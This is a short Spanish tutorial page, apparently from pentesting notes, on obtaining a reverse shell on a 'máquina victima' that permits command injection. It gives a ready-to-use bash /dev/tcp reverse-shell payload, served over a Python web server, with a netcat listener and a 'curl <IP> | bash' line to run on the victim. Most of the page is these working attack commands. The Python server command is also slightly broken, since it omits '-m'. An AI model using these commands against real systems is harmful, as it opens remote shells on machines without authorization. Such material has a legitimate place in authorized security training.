---
sidebar_position: 3
---

# Ejecutar terminal remota

En este apartado se vera como lanzar una terminal mediante el comando curl y python, esto se utilizara cuando se permita la ejecución de comandos.

## Crear archivo index.html

En el directorio que en pasos posteriores se convertira en un servidor web, creamos un archivo **index.html** con el siguiente contenido.

```bash
#!/bin/bash
bash -i >& /dev/tcp/<IpDeTuMaquina>/<PuertoLibre> 0>&1
```
Este comando permite lanzar un bash con el usuario actual.

## Crear servidor web con Pyhton

Una vez se situa en el directorio que contiene el archivo index.html creado con anterioridad se ejecutara el siguiente comando:
```bash
sudo python3 http.server 80
```
Con esto ya se habria lanzado un servidor web en el puerto 80.

## Ponerse en modo escucha

Antes de lanzar el index.html, en **nuestra máquina principal** usaremos netcat con el puerto utilizado en el archivo index.html
```bash
nc -lvp <Puerto usado en index.html>
```
Con esto tendremos una escucha, que se encargara de que en el momento que se lance el archivo **index.html** poder interceptar la terminal

## Ejecutar index.html

Para esto se hara uso del comando **curl**, este comando esta dedicado a la transferencia de archivos, este comando se utilizara donde la máquina victima permita el uso de insercción de comandos.
```bash
curl <IP de tu máquina> | bash
```

Con esto el **netcat** ya deberia haber detectado la terminal y solo quedaria [sanitizarla](./sanitizar).